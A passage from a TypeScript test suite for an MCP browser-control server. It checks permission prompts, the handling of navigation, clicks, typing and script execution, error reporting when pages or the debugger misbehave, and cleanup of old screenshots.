      `http://127.0.0.1:${port}/mcp?sessionId=session-does-not-exist`,
      {
        method: "DELETE",
        headers: { Authorization: `Bearer ${token}` },
      }
    );

    expect(res.status).toBe(200);
  });

  it("reports its port and that it is running", () => {
    expect(server.getPort()).toBe(port);
    expect(server.isRunning()).toBe(true);
  });

  it("is idempotent to start twice", async () => {
    expect(await server.start()).toBe(port);
  });

  it("turns a thrown handler into an internal error carrying the request id", async () => {
    // getType throwing is the shape a view mid-teardown has; this one throws
    // from where nothing catches, which is what -32603 is for.
    liveViews = [
      {
        get id() {
          throw new Error("view exploded");
        },
      } as never,
    ];
    const res = await rpc({
      jsonrpc: "2.0",
      id: 99,
      method: "tools/call",
      params: null,
    });

    expect(res).toMatchObject({ id: 99 });
  });
});

describe("when a tool is gated", () => {
  let gated: import("./mcp-browser-server").McpBrowserServer;
  let gatedPort: number;
  const asked: Array<{ tool: string; summary: string; sessionId?: string }> =
    [];
  let verdict: "allow" | "deny" = "allow";

  const gatedCall = async (
    name: string,
    args: Record<string, unknown>
  ): Promise<{ text: string; isError: boolean }> => {
    const res = await fetch(`http://127.0.0.1:${gatedPort}/mcp?session=gated`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: ++nextId,
        method: "tools/call",
        params: { name, arguments: args },
      }),
    });
    const body = (await res.json()) as { result?: ToolResult };

    return {
      text: body.result?.content?.[0]?.text ?? "",
      isError: body.result?.isError === true,
    };
  };

  beforeAll(async () => {
    const { McpBrowserServer } = await import("./mcp-browser-server");
    gated = new McpBrowserServer({
      target: () => fakeTarget,
      timeouts: { attachMs: 300, navigateMs: 600, historyMs: 600 },
      requestPermission: async (tool, summary, sessionId) => {
        asked.push({ tool, summary, sessionId });
        return verdict;
      },
    });
    gatedPort = await gated.start();
  });

  afterAll(() => gated.stop());

  beforeEach(() => {
    asked.length = 0;
    verdict = "allow";
  });

  it("asks before navigating, naming the URL so the user can judge it", async () => {
    await gatedCall("browser_navigate", {
      action: "goto",
      url: "https://example.test/x",
    });

    expect(asked).toEqual([
      {
        tool: "browser_navigate",
        summary: "Open https://example.test/x",
        sessionId: "gated",
      },
    ]);
  });

  it("does not ask for a snapshot, which would be prompt fatigue with nothing gained", async () => {
    respondWith(() => oneButton);
    await gatedCall("browser_snapshot", { action: "snapshot" });

    expect(asked).toHaveLength(0);
  });

  it("names the element for an interaction and the intent for a script", async () => {
    respondWith(() => ({ status: "ok" }));
    await gatedCall("browser_interact", { action: "click", ref: "@e1" });
    await gatedCall("browser_execute", { code: "1" });

    expect(asked.map((a) => a.summary)).toEqual([
      "click @e1",
      "Run JavaScript in the page",
    ]);
  });

  it("describes a navigation with no URL, rather than rendering undefined", async () => {
    await gatedCall("browser_navigate", { action: "back" });

    expect(asked[0]?.summary).toBe("Navigate (back)");
  });

  it("stops the tool when the user declines", async () => {
    verdict = "deny";
    const { text, isError } = await gatedCall("browser_navigate", {
      action: "goto",
      url: "https://example.test/y",
    });

    expect(isError).toBe(true);
    expect(text).toContain("permission denied");
  });
});

describe("when the page or the debugger misbehaves", () => {
  it("falls back to the debugger when capturePage fails", async () => {
    page.capturePage = async () => {
      throw new Error("view not painted");
    };
    const response = await rpc({
      jsonrpc: "2.0",
      id: ++nextId,
      method: "tools/call",
      params: { name: "browser_snapshot", arguments: { action: "screenshot" } },
    });
    const content = response.result?.content ?? [];

    expect(response.result?.isError).not.toBe(true);
    expect(content[0]).toMatchObject({ type: "image", mimeType: "image/jpeg" });
    expect(content[1]?.text).toMatch(/screenshot-\d+\.jpg$/);
  });

  it("answers with the description alone when nothing can capture the page", async () => {
    page.capturePage = async () => {
      throw new Error("view not painted");
    };
    page.debugger.sendCommand = async (method: string) => {
      if (method === "Page.captureScreenshot")
        throw new Error("Debugger detached");
      return {};
    };
    const { text, isError } = await call("browser_snapshot", {
      action: "screenshot",
    });

    expect(isError).toBe(false);
    expect(text).toContain("No screenshot could be captured");
    expect(text).toContain("URL: https://example.test/start");
  });

  it("reports a page that threw rather than pretending the action worked", async () => {
    respondWith(() => new Error("TypeError: el is null"));
    const { text, isError } = await call("browser_snapshot", {
      action: "snapshot",
    });

    expect(isError).toBe(true);
    expect(text).toContain("TypeError");
  });

  it("skips a view that throws while being inspected", async () => {
    const broken = {
      getType: () => {
        throw new Error("mid-teardown");
      },
    } as never;
    liveViews = [broken, page];
    respondWith(() => oneButton);

    expect(
      (await call("browser_snapshot", { action: "snapshot" })).isError
    ).toBe(false);
  });

  it("reports a goto that never arrived, and says where the preview actually is", async () => {
    page.loadURL = async () => {
      page.loading = true;
    };
    const { text, isError } = await call("browser_navigate", {
      action: "goto",
      url: "https://elsewhere.test/",
    });

    expect(isError).toBe(true);
    expect(text).toContain("did not complete");
    expect(text).toContain("https://example.test/start");
  });

  it("says a history move had not finished rather than claiming it had", async () => {
    await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/second",
    });
    page.goBack = () => {
      page.loading = true;
    };
    const { text } = await call("browser_navigate", { action: "back" });

    expect(text).toContain("had not finished");
  });

  it("attaches the debugger on first use rather than assuming it is attached", async () => {
    expect(page.debugger.attached).toBe(false);
    respondWith(() => oneButton);
    await call("browser_snapshot", { action: "snapshot" });

    expect(page.debugger.attached).toBe(true);
  });

  it("picks up a pane that appears while it is waiting", async () => {
    liveViews = [];
    setTimeout(() => {
      liveViews = [page];
    }, 120);
    respondWith(() => oneButton);

    expect(
      (await call("browser_snapshot", { action: "snapshot" })).isError
    ).toBe(false);
  });
});

describe("every action refuses a target it was not given", () => {
  // One shape, repeated: `refError` is the only correct answer when nothing
  // resolves, and each action reaching it is a separate branch.
  for (const action of [
    "click",
    "fill",
    "select",
    "hover",
    "scroll_into_view",
    "focus",
    "check",
    "uncheck",
  ]) {
    it(`${action} asks for a ref instead of guessing`, async () => {
      const args: Record<string, unknown> = { action };
      if (action === "fill") args.text = "x";
      if (action === "select") args.value = "x";

      const { text, isError } = await call("browser_interact", args);

      expect(isError).toBe(true);
      expect(text).toContain("ref is required");
    });
  }

  it("type still requires the text it would append", async () => {
    expect((await call("browser_interact", { action: "type" })).isError).toBe(
      true
    );
  });
});

describe("every action reports an element that has gone", () => {
  const goneFor = async (
    action: string,
    extra: Record<string, unknown> = {}
  ): Promise<string> => {
    await seedRefs();
    respondWith(() =>
      action === "click" || action === "fill" || action === "type"
        ? { status: "not_found" }
        : "not_found"
    );
    const { text, isError } = await call("browser_interact", {
      action,
      ref: "@e1",
      ...extra,
    });

    expect(isError).toBe(true);

    return text;
  };

  it("says so for hover", async () => {
    expect(await goneFor("hover")).toContain("not found");
  });
  it("says so for scroll_into_view", async () => {
    expect(await goneFor("scroll_into_view")).toContain("not found");
  });
  it("says so for focus", async () => {
    expect(await goneFor("focus")).toContain("not found");
  });
  it("says so for check", async () => {
    expect(await goneFor("check")).toContain("not found");
  });
  it("says so for type", async () => {
    expect(await goneFor("type", { text: "x" })).toContain("not found");
  });

  it("names the CSS selector when that is what the caller used", async () => {
    // The other message: no ref to blame, so it points at the selector and
    // suggests refs instead.
    respondWith(() => ({ status: "not_found" }));
    const { text } = await call("browser_interact", {
      action: "click",
      selector: ".gone",
    });

    expect(text).toContain("Element not found: .gone");
    expect(text).toContain("@eN refs");
  });
});

describe("typing into something that cannot take it", () => {
  it("names the tag rather than throwing Illegal invocation from the page", async () => {
    await seedRefs();
    respondWith(() => ({ status: "not_fillable", tag: "section" }));
    const { text, isError } = await call("browser_interact", {
      action: "type",
      ref: "@e1",
      text: "x",
    });

    expect(isError).toBe(true);
    expect(text).toContain("<section>");
  });

  it("reports a read-only field", async () => {
    await seedRefs();
    respondWith(() => ({ status: "not_editable", tag: "input" }));
    expect(
      (
        await call("browser_interact", {
          action: "type",
          ref: "@e1",
          text: "x",
        })
      ).isError
    ).toBe(true);
  });

  it("reports a framework that reset what was typed", async () => {
    await seedRefs();
    respondWith(() => ({ status: "rejected" }));
    const { text } = await call("browser_interact", {
      action: "type",
      ref: "@e1",
      text: "x",
    });

    expect(text).toContain("reset its value");
  });

  it("types into a named element, moving the cursor to it first", async () => {
    await seedRefs();
    respondWith(() => ({ status: "ok" }));
    const { isError } = await call("browser_interact", {
      action: "type",
      ref: "@e1",
      text: "x",
    });

    expect(isError).toBe(false);
  });
});

describe("pressing keys", () => {
  it("carries every modifier through to the browser", async () => {
    const sent: Array<Record<string, unknown>> = [];
    page.debugger.sendCommand = async (
      method: string,
      params?: Record<string, unknown>
    ) => {
      if (method === "Input.dispatchKeyEvent") {
        sent.push(params ?? {});
        return {};
      }
      if (method === "Runtime.evaluate") {
        const expression = String(params?.expression ?? "");
        return {
          result: { value: expression.includes("__abacusBotKeySeen ===") },
        };
      }
      return {};
    };

    await call("browser_interact", {
      action: "press",
      key: "Control+Alt+Shift+Meta+a",
    });

    // alt 1 | control 2 | meta 4 | shift 8
    expect(sent[0]?.modifiers).toBe(15);
  });

  it("falls back rather than refusing a key the debugger will not take", async () => {
    respondWith(() => null);
    const { text, isError } = await call("browser_interact", {
      action: "press",
      key: "F13",
    });

    expect(isError).toBe(false);
    expect(text).toContain("Pressed F13");
  });

  it("accepts the key under its alternate argument name", async () => {
    respondWith(
      (expression) => expression.includes("__abacusBotKeySeen ===") || null
    );
    expect(
      (await call("browser_interact", { action: "press", text: "Tab" })).isError
    ).toBe(false);
  });

  it("treats a probe that cannot be read as an undelivered key", async () => {
    respondWith((expression) =>
      expression.includes("__abacusBotKeySeen ===")
        ? new Error("Error: page went away")
        : null
    );
    const { isError } = await call("browser_interact", {
      action: "press",
      key: "Enter",
    });

    expect(isError).toBe(false);
    expect(evaluated.join("\n")).toContain("new KeyboardEvent");
  });
});

describe("with no browser pane, every tool says the same thing", () => {
  beforeEach(() => {
    liveViews = [];
  });

  it("for navigate back", async () => {
    expect((await call("browser_navigate", { action: "back" })).text).toContain(
      "web_fetch"
    );
  });

  it("for navigate forward", async () => {
    expect(
      (await call("browser_navigate", { action: "forward" })).text
    ).toContain("web_fetch");
  });

  it("for navigate reload", async () => {
    expect(
      (await call("browser_navigate", { action: "reload" })).text
    ).toContain("web_fetch");
  });

  it("for interact", async () => {
    expect(
      (await call("browser_interact", { action: "click", ref: "@e1" })).text
    ).toContain("web_fetch");
  });

  it("for execute", async () => {
    expect((await call("browser_execute", { code: "1" })).text).toContain(
      "web_fetch"
    );
  });
});

describe("housekeeping", () => {
  it("deletes screenshots older than a day and keeps the rest", async () => {
    const fs = await import("fs");
    const { abacusBotHome } = await import("../../paths");
    const dir = path.join(abacusBotHome(), "temp");

    fs.mkdirSync(dir, { recursive: true });
    const stale = path.join(dir, "screenshot-old.png");
    const fresh = path.join(dir, "screenshot-new.png");
    fs.writeFileSync(stale, "x");
    fs.writeFileSync(fresh, "x");
    const twoDaysAgo = new Date(Date.now() - 2 * 24 * 60 * 60 * 1000);
    fs.utimesSync(stale, twoDaysAgo, twoDaysAgo);

    await call("browser_snapshot", { action: "screenshot" });

    expect(fs.existsSync(stale)).toBe(false);
    expect(fs.existsSync(fresh)).toBe(true);
  });

  it("closes the streams it is holding when it stops", async () => {
    const { McpBrowserServer } = await import("./mcp-browser-server");
    const throwaway = new McpBrowserServer({
      target: () => fakeTarget,
      timeouts: { attachMs: 50 },
    });
    const throwawayPort = await throwaway.start();
    const controller = new AbortController();

    const stream = await fetch(`http://127.0.0.1:${throwawayPort}/mcp`, {
      headers: { Authorization: `Bearer ${token}` },
      signal: controller.signal,
    });
    const reader = stream.body!.getReader();
    await reader.read();

    throwaway.stop();

    expect(throwaway.isRunning()).toBe(false);
    expect(throwaway.getPort()).toBeNull();
    controller.abort();
  });
});

describe("telling the renderer what the browser is doing", () => {
  it("asks the preview to follow a navigation", async () => {
    await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/next",
    });

    expect(rendererEvents).toContainEqual(
      expect.objectContaining({
        type: "mcp-open-preview",
        url: "https://example.test/next",
      })
    );
  });

  it("moves and clicks the on-screen cursor so the user can follow along", async () => {
    await seedRefs();
    rendererEvents.length = 0;

    respondWith((expression) =>
      expression.includes("getBoundingClientRect")
        ? { x: 12, y: 34 }
        : { status: "ok", tag: "button", text: "Go", x: 12, y: 34 }
    );
    await call("browser_interact", { action: "click", ref: "@e1" });

    expect(rendererEvents).toContainEqual(
      expect.objectContaining({ type: "mcp-cursor-move", x: 12, y: 34 })
    );
    expect(rendererEvents).toContainEqual(
      expect.objectContaining({ type: "mcp-cursor-click" })
    );
  });

  it("hides the cursor when the page changes under it", async () => {
    await call("browser_navigate", {
      action: "goto",
      url: "https://example.test/next",
    });

    expect(rendererEvents).toContainEqual(
      expect.objectContaining({ type: "mcp-cursor-hide" })
    );
  });
});

describe("a page that navigated on its own since the snapshot", () => {
  it("re-snapshots first, and refuses when the new page gives nothing back", async () => {
    await seedRefs();
    // A redirect, an SPA route change, a link the user clicked: no tool call
    // told the server, so only the URL check catches it.
    page.url = "https://example.test/somewhere-else";
    respondWith(() => null);

    const { text, isError } = await call("browser_interact", {
      action: "click",
      ref: "@e1",
    });

    expect(isError).toBe(true);
    expect(text).toContain("has navigated since the last snapshot");
    expect(evaluated.join("\n")).not.toContain("#go");
  });

  it("keeps a ref that survives the navigation, and names the new page's elements for one that did not", async () => {
    await seedRefs();
    page.url = "https://example.test/somewhere-else";
    respondWith(() => ({
      ...oneButton,
      url: "https://example.test/somewhere-else",
      tree: {
        tag: "main",
        children: [
          { ref: "@e2", selector: "#other", tag: "button", name: "Other" },
        ],
      },
    }));

    const { text, isError } = await call("browser_interact", {
      action: "click",
      ref: "@e1",
    });

    expect(isError).toBe(true);
    expect(text).toContain("@e1 is not on it");
    expect(text).toContain('@e2 [button] "Other"');
  });

  it("lets a fresh snapshot recover", async () => {
    await seedRefs();
    page.url = "https://example.test/somewhere-else";
    await call("browser_interact", { action: "click", ref: "@e1" });

    await seedRefs("session-1", {
      ...oneButton,
      url: "https://example.test/somewhere-else",
    });
    respondWith(() => ({ status: "ok", tag: "button", text: "", x: 1, y: 1 }));

    expect(
      (await call("browser_interact", { action: "click", ref: "@e1" })).isError
    ).toBe(false);
  });
});

describe("scrolling in each direction", () => {
  for (const [direction, expected] of [
    ["up", "dy"],
    ["down", "dy"],
    ["left", "dx"],
    ["right", "dx"],
  ] as const) {
    it(`moves on the ${expected} axis for ${direction}`, async () => {
      respondWith(() => ({
        dx: expected === "dx" ? 120 : 0,
        dy: expected === "dy" ? 120 : 0,
      }));
      const { text } = await call("browser_interact", {
        action: "scroll",
        direction,
      });

      expect(text).toContain("120px");
    });
  }

  it("scrolls a named element rather than the page", async () => {
    await seedRefs();
    respondWith(() => ({ dx: 0, dy: 200 }));
    await call("browser_interact", {
      action: "scroll",
      ref: "@e1",
      direction: "down",
    });

    expect(evaluated.join("\n")).toContain("#go");
  });

  it("names the element when it will not move any further", async () => {
    await seedRefs();
    respondWith(() => ({ dx: 0, dy: 0 }));
    const { text } = await call("browser_interact", {
      action: "scroll",
      ref: "@e1",
      direction: "down",
    });

    expect(text).toContain("@e1");
  });
});

describe("filling", () => {
  it("reports an input that vanished between snapshot and fill", async () => {
    await seedRefs();
    respondWith(() => ({ status: "not_found" }));
    const { text, isError } = await call("browser_interact", {
      action: "fill",
      ref: "@e1",
      text: "x",
    });

    expect(isError).toBe(true);
    expect(text).toContain("not found");
  });

  it("shortens a long value in the confirmation rather than echoing all of it", async () => {
    await seedRefs();
    respondWith(() => ({ status: "ok" }));
    const { text } = await call("browser_interact", {
      action: "fill",
      ref: "@e1",
      text: "y".repeat(80),
    });

    expect(text).toContain("...");
    expect(text.length).toBeLessThan(120);
  });
});

describe("summarising a call for the permission prompt", () => {
  it("falls back to the tool name for something it does not recognise", async () => {
    const { McpBrowserServer } = await import("./mcp-browser-server");
    const seen: string[] = [];
    const other = new McpBrowserServer({
      target: () => fakeTarget,
      timeouts: { attachMs: 50 },
      requestPermission: async (_tool, summary) => {
        seen.push(summary);
        return "deny";
      },
    });
    const otherPort = await other.start();

    await fetch(`http://127.0.0.1:${otherPort}/mcp`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "browser_levitate", arguments: {} },
      }),
    });

    expect(seen).toEqual(["browser_levitate"]);
    other.stop();
  });

  it("describes an interaction with a CSS selector, and one with neither", async () => {
    const { McpBrowserServer } = await import("./mcp-browser-server");
    const seen: string[] = [];
    const other = new McpBrowserServer({
      target: () => fakeTarget,
      timeouts: { attachMs: 50 },
      requestPermission: async (_tool, summary) => {
        seen.push(summary);
        return "deny";
      },
    });
    const otherPort = await other.start();
    const post = async (args: Record<string, unknown>): Promise<void> => {
      await fetch(`http://127.0.0.1:${otherPort}/mcp`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "tools/call",
          params: { name: "browser_interact", arguments: args },
        }),
      });
    };

    await post({ action: "click", selector: "#css" });
    await post({});

    expect(seen).toEqual(["click #css", "Interact with element"]);
    other.stop();
  });
});

describe("the shapes a page can come back in", () => {
  it("reads a compile failure that CDP reports without an exception object", async () => {
    // The other CDP shape: `text` and no `exception.description`. This is the
    // form isSyntaxError has to recognise for the statement-body retry to run.
    let attempts = 0;
    page.debugger.sendCommand = async (
      method: string,
      params?: Record<string, unknown>
    ) => {
      if (method !== "Runtime.evaluate") return {};
      attempts += 1;
      const expression = String(params?.expression ?? "");
      if (expression.includes("return (")) {
        return {
          exceptionDetails: { text: "Uncaught SyntaxError: Unexpected token" },
        };
      }
      return { result: { value: "ran as a statement" } };
    };

    const { text } = await call("browser_execute", { code: "let a = 1; a" });

    expect(attempts).toBe(2);
    expect(text).toBe('"ran as a statement"');
  });

  it("reports a page failure that carries no message at all", async () => {
    page.debugger.sendCommand = async (method: string) =>
      method === "Runtime.evaluate" ? { exceptionDetails: {} } : {};

    const { text, isError } = await call("browser_execute", { code: "x" });

    expect(isError).toBe(true);
    expect(text).toContain("JS error");
  });

  it("falls back to the view for a title and URL the snapshot did not include", async () => {
    respondWith(() => ({ tree: null, refCount: 0 }));
    const { text } = await call("browser_snapshot", { action: "snapshot" });

    expect(text).toContain("Page: Start");
    expect(text).toContain("URL: https://example.test/start");
  });

  it("takes the view's URL when the snapshot reports one that is not a string", async () => {
    await seedRefs("url-less", { ...oneButton, url: 42 });
    respondWith(() => ({ status: "ok", tag: "button", text: "", x: 1, y: 1 }));

    // The refs were filed under the view's URL, so they still resolve.
    expect(
      (
        await call(
          "browser_interact",
          { action: "click", ref: "@e1" },
          "url-less"
        )
      ).isError
    ).toBe(false);
  });

  it("reports an unmatched option even when the page listed none", async () => {
    await seedRefs();
    respondWith(() => ({ status: "no_match" }));
    const { text, isError } = await call("browser_interact", {
      action: "select",
      ref: "@e1",
      value: "zz",
    });

    expect(isError).toBe(true);
    expect(text).toContain("nothing was selected");
  });

  it("treats a scroll the page said nothing about as no movement", async () => {
    respondWith(() => null);
    const { text } = await call("browser_interact", {
      action: "scroll",
      direction: "down",
    });

    expect(text).toContain("already at the down limit");
  });

  it("reports a checkbox that would not turn on, not just one that would not turn off", async () => {
    await seedRefs();
    respondWith(() => "unchanged");
    const { text } = await call("browser_interact", {
      action: "check",
      ref: "@e1",
    });

    expect(text).toContain("still unchecked");
  });

  it("names a printable key by its code in the synthetic fallback", async () => {
    respondWith((expression) =>
      expression.includes("__abacusBotKeySeen ===") ? false : null
    );
    await call("browser_interact", { action: "press", key: "a" });

    expect(evaluated.join("\n")).toContain('"KeyA"');
  });

  it("survives the page throwing something that is not an Error", async () => {
    page.debugger.sendCommand = async () => {
      throw "a bare string";
    };
    const { isError } = await call("browser_snapshot", { action: "snapshot" });

    expect(isError).toBe(true);
  });
});

describe("with the shipped timeouts rather than the test ones", () => {
  it("navigates on the defaults", async () => {
    // Covers the fallbacks in attachTimeout/navigateTimeout/historyTimeout,
    // which every other case here overrides.
    const { McpBrowserServer } = await import("./mcp-browser-server");
    const plain = new McpBrowserServer({ target: () => fakeTarget });
    const plainPort = await plain.start();

    const res = await fetch(`http://127.0.0.1:${plainPort}/mcp`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: {
          name: "browser_navigate",
          arguments: { action: "goto", url: "https://example.test/defaults" },
        },
      }),
    });
    const body = (await res.json()) as { result?: ToolResult };

    expect(body.result?.isError).toBeUndefined();
    expect(body.result?.content?.[0]?.text).toContain(
      "https://example.test/defaults"
    );
    plain.stop();
  });

  it("reloads on the defaults too", async () => {
    const { McpBrowserServer } = await import("./mcp-browser-server");
    const plain = new McpBrowserServer({ target: () => fakeTarget });
    const plainPort = await plain.start();

    page.reload = () => {
      page.url = "https://example.test/reloaded";
    };
    const res = await fetch(`http://127.0.0.1:${plainPort}/mcp`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "browser_navigate", arguments: { action: "reload" } },
      }),
    });
    const body = (await res.json()) as { result?: ToolResult };

    expect(body.result?.content?.[0]?.text).toContain("reloaded");
    plain.stop();
  });
});

describe("when the on-screen cursor animation fails", () => {
  // Purely cosmetic: it moves a pointer the user can watch. It must never be
  // able to take an interaction down with it.
  const actions: Array<[string, Record<string, unknown>, unknown]> = [
    ["click", {}, { status: "ok", tag: "button", text: "", x: 1, y: 1 }],
    ["fill", { text: "x" }, { status: "ok" }],
    ["type", { text: "x" }, { status: "ok" }],
    ["select", { value: "x" }, { status: "ok", selected: "x" }],
    ["hover", {}, "ok"],
    ["scroll_into_view", {}, "ok"],
    ["focus", {}, "ok"],
    ["check", {}, "ok"],
    ["uncheck", {}, "ok"],
  ];

  for (const [action, extra, reply] of actions) {
    it(`${action} still works`, async () => {
      await seedRefs();
      respondWith((expression) => {
        if (
          expression.includes("getBoundingClientRect") &&
          expression.includes("r.left + r.width / 2")
        ) {
          return new Error("TypeError: the page went away mid-animation");
        }
        return reply;
      });

      expect(
        (await call("browser_interact", { action, ref: "@e1", ...extra }))
          .isError
      ).toBe(false);
    });
  }
});

describe("arguments the model left out", () => {
  it("rejects a navigate with no action", async () => {
    expect((await call("browser_navigate", {})).isError).toBe(true);
  });

  it("rejects a snapshot with no action", async () => {
    expect((await call("browser_snapshot", {})).isError).toBe(true);
  });

  it("rejects an interact with no action", async () => {
    expect((await call("browser_interact", {})).isError).toBe(true);
  });

  it("answers a request that carries no id", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({ jsonrpc: "2.0", method: "ping" }),
    });

    expect(await res.json()).toMatchObject({ id: null });
  });

  it("answers an idless initialize, tools/list, notification and unknown method", async () => {
    const send = async (method: string): Promise<unknown> => {
      const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ jsonrpc: "2.0", method }),
      });
      return res.json();
    };

    for (const method of [
      "initialize",
      "tools/list",
      "notifications/initialized",
      "nope/nope",
    ]) {
      expect(await send(method)).toMatchObject({ id: null });
    }
  });

  it("answers an idless tools/call", async () => {
    const res = await fetch(`http://127.0.0.1:${port}/mcp`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        method: "tools/call",
        params: { name: "browser_navigate" },
      }),
    });

    expect(await res.json()).toMatchObject({ id: null });
  });
});

describe("a few last shapes", () => {
  it("quotes the value asked for when the page does not say what it selected", async () => {
    await seedRefs();
    respondWith(() => ({ status: "ok" }));
    const { text } = await call("browser_interact", {
      action: "select",
      ref: "@e1",
      value: "in",
    });

    expect(text).toContain('"in"');
  });

  it("confirms an uncheck that took", async () => {
    await seedRefs();
    respondWith(() => "ok");
    const { text, isError } = await call("browser_interact", {
      action: "uncheck",
      ref: "@e1",
    });

    expect(isError).toBe(false);
    expect(text).toContain("Unchecked");
  });

  it("reports a page that threw something other than an Error out of execute", async () => {
    page.debugger.sendCommand = async () => {
      throw "not an Error at all";
    };
    const { text, isError } = await call("browser_execute", {
      code: "document.title",
    });

    expect(isError).toBe(true);
    expect(text).toContain("not an Error at all");
  });
});

describe("the last few corners", () => {
  it("stops cleanly when it was never started", async () => {
    const { McpBrowserServer } = await import("./mcp-browser-server");
    const unstarted = new McpBrowserServer({ target: () => fakeTarget });

    expect(() => unstarted.stop()).not.toThrow();
    expect(unstarted.isRunning()).toBe(false);
    expect(unstarted.getPort()).toBeNull();
  });

  it("answers inline when the post names a stream that is not open", async () => {
    // The SSE session was closed, or never existed. The reply has to come back
    // on the POST rather than being written into a stream nobody is holding.
    const res = await fetch(
      `http://127.0.0.1:${port}/mcp?sessionId=session-9999`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ jsonrpc: "2.0", id: 5, method: "ping" }),
      }
    );

    expect(res.status).toBe(200);
    expect(await res.json()).toMatchObject({ id: 5, result: {} });
  });

  it("describes a navigate with no action at all for the prompt", async () => {
    const { McpBrowserServer } = await import("./mcp-browser-server");
    const seen: string[] = [];
    const other = new McpBrowserServer({
      target: () => fakeTarget,
      timeouts: { attachMs: 50 },
      requestPermission: async (_tool, summary) => {
        seen.push(summary);
        return "deny";
      },
    });
    const otherPort = await other.start();

    await fetch(`http://127.0.0.1:${otherPort}/mcp`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${token}`,
      },
      body: JSON.stringify({
        jsonrpc: "2.0",
        id: 1,
        method: "tools/call",
        params: { name: "browser_navigate", arguments: {} },
      }),
    });

    expect(seen).toEqual(["Navigate (unknown)"]);
    other.stop();
  });
});

/** Branch the fake page on which script it was sent. */
const scriptIs = {
  snapshot: (expression: string): boolean =>
    expression.includes("__abacusBotRefs"),
  settle: (expression: string): boolean =>
    expression.includes("MutationObserver") &&
    expression.includes("resolve(now - start)"),
  click: (expression: string): boolean => expression.includes("el.click()"),
  fill: (expression: string): boolean => expression.includes("nativeSet.call"),
  value: (expression: string): boolean =>
    expression.includes("isContentEditable ? el.textContent"),
  extract: (expression: string): boolean => expression.includes("rows.push"),
  center: (expression: string): boolean => expression.includes("r.width / 2"),
  keyProbe: (expression: string): boolean =>
    expression.includes("__abacusBotKeySeen"),
};

const fromInput = {
  ...oneButton,
  tree: {
    tag: "main",
    children: [
      {
        ref: "@e1",
        selector: "#from",
        tag: "input",
        name: "From",
        placeholder: "Where from?",
      },
      { ref: "@e2", selector: "#go", tag: "button", name: "Go" },
    ],
  },
  refCount: 2,
  visibleCount: 2,
};

const withSuggestion = {
  ...fromInput,
  tree: {
    tag: "main",
    children: [
      ...fromInput.tree.children,
      {
        ref: "@e7",
        selector: "#opt-del",
        tag: "option",
        name: "New Delhi (DEL)",
      },
      {
        ref: "@e8",
        selector: "#opt-dsm",
        tag: "option",
        name: "Des Moines (DSM)",
      },
    ],
  },
  refCount: 4,
  visibleCount: 4,
};

const cookieBanner = {
  ...oneButton,
  tree: {
    tag: "main",
    children: [
      { ref: "@e1", selector: "#go", tag: "button", name: "Go" },
      { ref: "@e3", selector: "#accept", tag: "button", name: "Accept all" },
    ],
  },
  overlays: [
    {
      kind: "banner",
      text: "We use cookies",
      buttons: [{ ref: "@e3", name: "Accept all" }],
    },
  ],
};

describe("reporting what an action changed", () => {
  it("lists the elements that appeared, with refs ready to use", async () => {
    await seedRefs();
    respondWith((expression) => {
      if (scriptIs.snapshot(expression))
        return {
          ...oneButton,
          tree: {
            tag: "main",
            children: [
              { ref: "@e1", selector: "#go", tag: "button", name: "Go" },
              {
                ref: "@e2",
                selector: "#r1",
                tag: "li",
                name: "Result one",
                readonly: true,
              },
            ],
          },
          refCount: 2,
          visibleCount: 2,
        };
      if (scriptIs.settle(expression)) return 120;
      if (scriptIs.center(expression)) return { x: 1, y: 1 };
      return { status: "ok", tag: "button", text: "Go", x: 1, y: 1 };
    });

    const { text, isError } = await call("browser_interact", {
      action: "click",
      ref: "@e1",
    });

    expect(isError).toBe(false);
    expect(text).toContain("Clicked @e1");
    expect(text).toContain("1 new element");
    expect(text).toContain('@e2 [li] (text) "Result one"');
    // The new ref is usable right away, without another snapshot.
    respondWith(() => ({ status: "ok", tag: "li", text: "", x: 1, y: 1 }));
    expect(
      (await call("browser_interact", { action: "click", ref: "@e2" })).isError
    ).toBe(false);
  });

  it("says where the page went when a click navigated", async () => {
    await seedRefs();
    respondWith((expression) => {
      if (scriptIs.snapshot(expression))
        return {
          ...oneButton,
          url: "https://example.test/next",
          title: "Next",
        };
      if (scriptIs.settle(expression)) return 50;
      if (scriptIs.center(expression)) return { x: 1, y: 1 };
      return { status: "ok", tag: "button", text: "", x: 1, y: 1 };
    });

    const { text } = await call("browser_interact", {
      action: "click",
      ref: "@e1",
    });

    expect(text).toContain("Now at https://example.test/next");
    expect(text).toContain("Title: Next");
  });

  it("names a banner that landed on top, with its buttons", async () => {
    await seedRefs();
    respondWith((expression) => {
      if (scriptIs.snapshot(expression)) return cookieBanner;
      if (scriptIs.settle(expression)) return 50;
      if (scriptIs.center(expression)) return { x: 1, y: 1 };
      return { status: "ok", tag: "button", text: "", x: 1, y: 1 };
    });

    const { text } = await call("browser_interact", {
      action: "click",
